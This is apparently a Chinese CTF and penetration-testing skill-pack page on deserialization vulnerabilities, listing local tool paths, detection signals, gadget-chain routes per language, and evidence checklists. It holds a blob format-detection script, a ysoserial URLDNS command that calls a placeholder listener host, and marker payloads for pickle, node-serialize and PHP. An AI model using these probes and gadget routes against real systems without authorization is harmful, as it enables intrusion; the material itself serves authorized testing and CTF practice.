# Deserialization Vulnerabilities

> **来源**：改编自 `LING71671/open-reverselab` 的 `kb/ctf-website/techniques/05-deserialization/deserialization.md`（GPL-3.0）。原 frontmatter 的 `mcp_tools` 映射已剔除——本技能包未挂载 `run_ctf_tool` / `http_probe`，改用本地工具链。
> **能力域**：本文为技术能力说明，按项目 `scope.md` 直接套用。
> **什么时候用**：命中「deserialization / 反序列化 / pickle / PHP unserialize」这类信号时，把本文当打点清单读；命中即进「步骤」，命中不了就换主题。

## 适用信号

- deserialization
- 反序列化
- pickle
- PHP unserialize
- Java gadget chain
- ysoserial
- Hessian
- ViewState
- YAML

## 前置

- 授权：目标在 scope 内（`case-init.ps1` 已 grant），测试时段与限速已约定。
- 工具定位走探测层，别猜路径：

```powershell
. 'C:\relab2\skillpack\skills\scripts\lib\Bootstrap.ps1'
$r = Resolve-ReverseToolSpec -Name '<toolid>'   # 例：sqlmap / httpx / ffuf / curl / python
& $r.Command <参数>                                # 永远用完整路径，不依赖 cwd
```

- Python 解释器用探测层的 `python`（本机逆向库集中在 `D:\EXE\python\python.exe`，`venv-re` 是空壳，别去那里找库）。
- 本文脚本默认只读、只打点；扩大范围前先回到 scope 确认。
- 本文涉及的工具与本机实际状态（探测层 `Resolve-ReverseToolSpec` 于 2026-10-10 实测）：

| 工具 | 本机状态 | 本机命令 / 替代方案 |
|---|---|---|
| `playwright` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'playwright').Command ...` → `D:\Tools\Node\playwright.cmd` |
| `objection` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'objection').Command ...` → `D:\EXE\python\Scripts\objection.exe` |
| `subfinder` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'subfinder').Command ...` → `D:\Tools\subfinder\subfinder.exe` |
| `gobuster` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'gobuster').Command ...` → `D:\Tools\gobuster\gobuster.exe` |
| `mitmdump` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'mitmdump').Command ...` → `D:\EXE\python\Scripts\mitmdump.exe` |
| `binwalk` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'binwalk').Command ...` → `C:\Users\toti\.cargo\bin\binwalk.exe` |
| `openssl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'openssl').Command ...` → `C:\Program Files\Git\usr\bin\openssl.exe` |
| `katana` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'katana').Command ...` → `D:\Tools\katana\katana.exe` |
| `nuclei` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nuclei').Command ...` → `D:\Tools\nuclei\nuclei.exe` |
| `python` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'python').Command ...` → `D:\EXE\python\python.exe` |
| `sqlmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'sqlmap').Command ...` → `D:\Tools\sqlmap\sqlmap.py` |
| `tshark` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'tshark').Command ...` → `D:\Tools\Wireshark\tshark.exe` |
| `frida` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'frida').Command ...` → `D:\EXE\python\Scripts\frida.exe` |
| `httpx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'httpx').Command ...` → `D:\Tools\httpx\httpx.exe` |
| `naabu` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'naabu').Command ...` → `D:\Tools\naabu\naabu.exe` |
| `curl` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'curl').Command ...` → `C:\WINDOWS\system32\curl.exe` |
| `dnsx` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'dnsx').Command ...` → `D:\Tools\dnsx\dnsx.exe` |
| `ffuf` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'ffuf').Command ...` → `D:\Tools\ffuf\ffuf.exe` |
| `nmap` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'nmap').Command ...` → `D:\Tools\nmap\nmap.exe` |
| `node` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'node').Command ...` → `D:\Tools\Node\node.exe` |
| `adb` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'adb').Command ...` → `D:\Tools\android\AndroidKiller_fix\bin\adb\adb.exe` |
| `git` | ✅ 已验证 | `& (Resolve-ReverseToolSpec -Name 'git').Command ...` → `C:\Program Files\Git\cmd\git.exe` |
| `interactsh-client` | 未安装 | OOB 通道需自备回显服务（授权环境内的 VPS + `python -m http.server`）；本机无此工具 |
| `nuclei-templates` | 随 nuclei 提供 | `nuclei -t <模板目录>`；模板需联网 `-update-templates` |

- 上表中标「未安装」的工具**不要照抄原库的裸命令**：`Get-Command` 查空就下结论是错的，
  但四级探测 `Available=False` 是结论——此时按替代方案手写脚本，或先装再跑。


## 步骤

1. **PHP** — `__destruct`, `__toString`, Phar metadata, SoapClient SSRF
2. **Java** — URLDNS, CommonsCollections, Spring, Groovy, Hessian/Dubbo
3. **Python** — `__reduce__`, opcode 手写, 已加载模块
4. **Node** — IIFE, prototype pollution 串联
5. **.NET** — ysoserial.net format/gadget 匹配
6. **Ruby/YAML** — YAML object graph, ERB/Gem gadgets

## 判据

判据必须是外部可观测的（状态码、响应字段、差分、落盘文件），不是「命令有输出」。

- **命中样本** — URLDNS/DNS callback
- **失败样本** — Base64 只是普通 token
- **命中样本** — `__wakeup/__destruct` 错误或输出变化
- **失败样本** — 数据被 JSON 包裹未 unserialize
- **命中样本** — 自定义 marker 被执行/回显
- **失败样本** — Unpickler 限制全部拒绝
- **命中样本** — 函数字段被还原
- **失败样本** — JSON.parse 不执行
- **命中样本** — MAC/validationKey 线索
- **失败样本** — ViewStateUserKey/MAC 阻断
- **命中样本** — 类型实例化错误/回连
- **失败样本** — 类型白名单拒绝
- **第一 oracle** — 修改普通属性看输出
- **第一 oracle** — marker print/error

## 坑

- 探针命令在**未本机验证**时不要当成既定事实跑；先用探测层确认 `Available=True`。
- 噪声排除：先固定 baseline（同 URL 同 token 跑 3 次），再只改一个变量做差分。
- 不要把「状态码 200」当命中——WAF/缓存/软 404 都返回 200，命中判据要落到具体业务字段。

## 相关

- 见本技能 `../../SKILL.md` 的 references 索引。

## 技术正文

> 以下为原库正文（保留全部技术细节与脚本），仅移除原 `MCP 工具映射` 章节并重写跨文档链接。

反序列化不是“见到 blob 就上 gadget”。先确认格式、入口、依赖、触发点、回显或回连，再选链。CTF 里最容易失误的是格式识别错误、payload 被 Base64/URL/签名包裹、或者 gadget 触发了但没有可见 oracle。

## 输入信号

| 信号 | 立即动作 | 命中样本 | 失败样本 |
|---|---|---|---|
| Base64 以 `rO0AB` 开头 | Java 序列化路线 | URLDNS/DNS callback | Base64 只是普通 token |
| PHP `O:`, `a:`, `s:` | PHP serialize 路线 | `__wakeup/__destruct` 错误或输出变化 | 数据被 JSON 包裹未 unserialize |
| Python pickle `gAS`, `\x80\x04` | pickle opcode 路线 | 自定义 marker 被执行/回显 | Unpickler 限制全部拒绝 |
| Node `_$$ND_FUNC$$_` | node-serialize 路线 | 函数字段被还原 | JSON.parse 不执行 |
| `__VIEWSTATE` | .NET ViewState | MAC/validationKey 线索 | ViewStateUserKey/MAC 阻断 |
| YAML/XML/Hessian/Jackson 类型字段 | 多态反序列化 | 类型实例化错误/回连 | 类型白名单拒绝 |

## 工作流

```text
抽取 blob 与编码层
  → magic bytes / 类型字段识别
  → 建 marker payload 和 baseline oracle
  → 指纹语言、依赖、类路径、过滤器
  → 选择 gadget 或业务类链
  → 用回显、DNS/HTTP callback、状态差异记录 Evidence
```

## 0. 格式识别脚本

```python
#!/usr/bin/env python3
import argparse
import base64
import binascii
import json
import re

MAGIC = [
    (b"\xac\xed\x00\x05", "java-serialized"),
    (b"rO0AB", "java-base64"),
    (b"O:", "php-object"),
    (b"a:", "php-array"),
    (b"\x80\x04", "python-pickle4"),
    (b"\x80\x05", "python-pickle5"),
    (b"_$$ND_FUNC$$_", "node-serialize"),
    (b"AAEAAAD", ".net-binaryformatter-base64"),
    (b"---", "yaml"),
]

def layers(raw):
    yield "raw", raw
    for name, fn in [
        ("url", lambda x: bytes.fromhex(x.decode().replace("%", ""))),
        ("base64", lambda x: base64.b64decode(x + b"=" * (-len(x) % 4))),
        ("hex", lambda x: binascii.unhexlify(re.sub(rb"\s+", b"", x))),
    ]:
        try:
            yield name, fn(raw)
        except Exception:
            pass

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("blob")
    args = ap.parse_args()
    raw = args.blob.encode()
    for layer, data in layers(raw):
        hits = [fmt for magic, fmt in MAGIC if data.startswith(magic) or magic in data[:80]]
        print(json.dumps({"layer": layer, "len": len(data), "hits": hits, "prefix_hex": data[:24].hex()}, ensure_ascii=False))

if __name__ == "__main__":
    main()
```

## 1. 路由矩阵

| 格式 | 指纹 | 第一 oracle | 下一步 |
|---|---|---|---|
| PHP serialize | `O:<len>:"Class"` | 修改普通属性看输出 | 找 magic method 和类链 |
| Python pickle | `\x80`, `GLOBAL`, `REDUCE` | marker print/error | opcode/白名单绕过 |
| Java | `aced0005` / `rO0AB` | URLDNS callback | 依赖/gadget 指纹 |
| Node serialize | `_$$ND_FUNC$$_` | IIFE marker | require/module 限制 |
| .NET ViewState | `__VIEWSTATE` | MAC/错误文本 | validationKey/ViewStateUserKey |
| YAML/Jackson/Hessian | type tag/class name | 类型实例化错误 | 多态 gadget/业务类 |

## 2. Java URLDNS callback

```bash
# 先用 DNS/HTTP callback 证明 readObject 触发，再换更高价值链
java -jar ysoserial.jar URLDNS "http://case-id.listener.example" | base64 -w0
```

Evidence：callback 域名、时间、来源 IP、目标参数、响应错误。没有 callback 时，不要直接升级 gadget，先确认编码层、签名、压缩和入口是否真的走反序列化。

## 3. PHP / Python / Node marker

```python
#!/usr/bin/env python3
import pickle
import base64

class Marker:
    def __reduce__(self):
        return (print, ("PICKLE_MARKER",))

print(base64.b64encode(pickle.dumps(Marker())).decode())
```

```json
{"marker":"_$$ND_FUNC$$_function(){return 'NODE_SERIALIZE_MARKER'}()"}
```

```text
O:8:"stdClass":1:{s:6:"marker";s:10:"PHP_MARKER";}
```

这些 marker 用来判断“是否执行/还原/进入错误分支”，不是最终链。成功样本是 marker 回显、错误栈变化、callback 到达或业务状态变化。

## 4. Gadget 选择矩阵

| 语言 | 证据 | 常见路线 |
|---|---|---|
| PHP | class name、Composer lock、magic method | `__destruct`, `__toString`, Phar metadata, SoapClient SSRF |
| Java | classpath、依赖版本、JDK | URLDNS, CommonsCollections, Spring, Groovy, Hessian/Dubbo |
| Python | pickle opcode、find_class 限制 | `__reduce__`, opcode 手写, 已加载模块 |
| Node | node-serialize/serialize-javascript | IIFE, prototype pollution 串联 |
| .NET | formatter、ViewState、MAC | ysoserial.net format/gadget 匹配 |
| Ruby/YAML | type tag、Rails/Gem 版本 | YAML object graph, ERB/Gem gadgets |

## 5. 入口变体

| 包裹方式 | 操作 |
|---|---|
| Cookie | URL/base64 双层编码，注意 `;` 截断 |
| JSON field | payload 字符串转义，Content-Type 固定 |
| multipart upload | filename/content metadata |
| session store | 修改 session cookie 或服务端 session 文件 |
| message queue | body + headers 同时带类型 |
| cache/job import | 上传配置文件后触发 worker |

## 攻击链

```text
blob 识别
  → marker oracle
  → 依赖/类路径指纹
  → gadget/业务类链
  → callback、回显、文件、SSRF、flag 差异
```

## Evidence

| 项 | 记录内容 |
|---|---|
| blob | 原始值、编码层、magic bytes、参数位置 |
| 格式 | 语言/库/formatter、错误文本、依赖证据 |
| marker | marker payload、回显/callback/状态差异 |
| gadget | 链名、前置依赖、触发方法、输入输出 |
| 成功样本 | callback、命令输出、文件读取、SSRF、flag 或业务状态变化 |
| 失败样本 | magic 不匹配、签名/MAC 拒绝、类不存在、filter 拒绝、无触发点 |
| 下一跳 | Soap/SSRF 转 04-ssrf；PP 串联转 prototype-pollution；凭据转 database/payment |
